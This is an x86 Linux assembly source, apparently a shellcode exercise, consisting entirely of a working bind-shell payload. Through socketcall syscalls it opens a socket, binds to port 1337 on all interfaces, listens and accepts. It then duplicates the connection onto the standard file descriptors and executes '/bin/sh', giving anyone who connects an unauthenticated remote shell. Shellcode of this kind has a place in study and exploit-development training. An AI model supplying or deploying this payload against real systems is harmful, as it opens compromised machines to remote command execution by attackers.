global _start

section .text

_start:
  ; start off with cleared registers
  xor eax, eax
  xor ebx, ebx
  xor ecx, ecx
  xor edx, edx
  xor esi, esi

  ; socketcall(eax==this, ebx=socketfunc, ecx=pointer_to_args)
  push byte 0x66  ; socketcall == 102 decimal or 0x66 hex
  pop eax
  inc ebx         ; #define SYS_SOCKET 1
  push ecx        ; 0 for IP_PROTO
  push 0x1        ; 1 for SOCK_STREAM
  push 0x2        ; #define PF_INET
  mov ecx, esp    ; push our args from the stack into ecx
  int 0x80        ; call the socket() func

  xchg esi, eax   ; sockfd eax -> esi
  push edx        ; v4lhost.sin_addr.s_addr = 0 or NULL
  inc ebx         ; ebx 1 -> ebx 2 for SYS_BIND
  push 0x3905     ; port 1337 in big endian format
  push bx         ; ebx is 2, so we're pushing 2 onto the stack
  mov ecx, esp    ; move a pointer to the arguments to bind() into ecx

  push byte 0x10  ; sizeof(v4lhost)
  push ecx        ; pointer to v4lhost
  push esi        ; push the sockfd onto the stack for the bind call
  mov ecx, esp    ; prepare for socketcall
  push byte 0x66  ; socketcall
  pop eax         ; grab the number rather than xor and mov
  int 0x80        ; call the command
   
  push edx        ; queuelimit = 0
  push esi        ; sockfd
  mov ecx, esp    ; put our arguments pointer into ecx
  mov ebx, 0x4    ; SYS_LISTEN = 4
  push byte 0x66  ; socketcall
  pop eax
  int 0x80

  push edx        ; NULL
  push edx        ; NULL
  push esi        ; sockfd
  mov ecx, esp    ; move our arguments pointer into ecx
  inc ebx         ; ebx is 4, so we're going to 4. 5 == SYS_ACCEPT
  push byte 0x66  ; push the socketcall value into the stack
  pop eax         ; put socketcall into eax
  int 0x80        ; call the accept socketcall
  
  xchg ebx, eax   ; ebx becomes the new sockfd
  xor ecx, ecx
lbl:
  mov al, 0x3f
  int 0x80
  inc ecx
  cmp cl, 0x4
  jne lbl

  push edx        ; null terminator
  push 0x68732f2f ; hs//
  push 0x6e69622f ; nib/
  mov ebx, esp    ; pointer to /bin/sh//
  mov ecx, edx    ; null 
  push byte 0xb   ; execve
  pop eax
  int 0x80
